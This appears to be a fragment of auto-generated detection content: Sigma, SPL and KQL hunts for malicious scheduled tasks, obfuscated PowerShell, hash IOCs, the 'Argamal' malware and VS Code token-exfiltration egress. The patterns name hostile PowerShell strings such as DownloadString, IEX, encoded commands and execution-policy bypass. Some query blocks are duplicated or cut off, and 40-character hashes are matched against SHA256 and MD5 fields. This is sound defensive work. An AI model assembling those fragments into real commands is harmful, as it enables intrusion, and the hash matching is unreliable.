        CommandLine|contains: '/create'
    selection_payload:
        CommandLine|contains:
            - 'powershell'
            - 'cmd.exe'
            - 'rundll32'
            - '-enc'
            - 'FromBase64'
            - '\Users\Public'
            - '\AppData\'
    condition: selection_schtasks and selection_payload
falsepositives:
    - GPO-driven scheduled tasks, MDT/SCCM imaging
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name="schtasks.exe" AND Processes.process="*/create*"
      AND (Processes.process="*powershell*" OR Processes.process="*cmd.exe*"
        OR Processes.process="*rundll32*" OR Processes.process="*-enc*"
        OR Processes.process="*FromBase64*" OR Processes.process="*\Users\Public*"
        OR Processes.process="*\AppData\*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name="schtasks.exe" AND Processes.process="*/create*"
      AND (Processes.process="*powershell*" OR Processes.process="*cmd.exe*"
        OR Processes.process="*rundll32*" OR Processes.process="*-enc*"
        OR Processes.process="*FromBase64*" OR Processes.process="*\Users\Public*"
        OR Processes.process="*\AppData\*")
    by Processes.dest, Processes.user, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
PowerShell encoded / obfuscated command Exploitation High
Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.
ATT&CKT1059.001 T1027
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("powershell.exe","pwsh.exe")
| where ProcessCommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
| where CommandLine matches regex @"(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)"
| project TimeGenerated, Computer, Account, NewProcessName,
          CommandLine, ParentProcessName
| order by TimeGenerated desc

title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion

    category: process_creation
    product: windows

    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'

falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high

        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"

    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`
File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d") or SHA1 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d") or MD5 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d") or SHA1 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d") or MD5 in~ ("42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["42add9475e67a1ccc6a6af94b5475d3defc01b85", "edce72f59e4c1d136cd1946af70d334c19df858d"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Article-specific behavioural hunt — Argamal: Malware hidden in hentai games Exploitation High
Auto-generated hunt targeting the specific binaries, paths, registry locations and command-line fragments named in this article. Hunting tier — needs analyst review and environment tuning before promotion to alerting.
ATT&CKT1053.005
Data sourcesEndpoint.Processes Endpoint.Filesystem Endpoint.Registry
// Article-specific bespoke detection — Argamal: Malware hidden in hentai games
// Hunts the actual binaries / paths / commandline fragments named
// in the article instead of a generic technique-class template.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where (FileName in~ ("ffmpeg.dll") or FolderPath has_any ("%USER%\AppData\Local"))
| project Timestamp, DeviceName, AccountName, FileName,
          FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc

// File-creation events for the named binaries / paths
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified")
| where (FolderPath has_any ("%USER%\AppData\Local") or FileName in~ ("ffmpeg.dll"))
| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

]

[LLM] VS Code (code.exe) outbound network egress to non-Microsoft/non-GitHub domain Command & Control Medium
Hunts for code.exe making HTTP/HTTPS connections to destinations outside the expected Microsoft + GitHub + extension marketplace footprint. Catches the OAuth-token exfiltration leg of Askar's github.dev webview exploit, where a malicious VS Code extension installed via the .ipynb onerror chain ships the GitHub OAuth token off-host to attacker C2. Rationale: Targets the smoking-gun network leg of Askar's PoC chain (cybersecuritynews.com/cyberpress.org confirm): malicious VS Code extension installed via the simulated-keypress trick reads the OAuth token POST'd by github.com to github.dev and ships it off-host. Legitimate code.exe traffic stays within Microsoft + GitHub + a small marketplace CDN footprint, so anything else is high-signal. Cross-checked: https://cybersecuritynews.com/1-click-github-token-vulnerability/, https://news.ycombinator.com/item?id=48371562. Cross-checked against: • https://cybersecuritynews.com/1-click-github-token-vulnerability/ • https://cyberpress.org/1-click-github-flaw/ • https://blog.ammaraskar.com/ • https://news.ycombinator.com/item?id=48371562

id: 8c9d2f10-9b8e-4d6f-8f2a-3e1b2c4d5a01
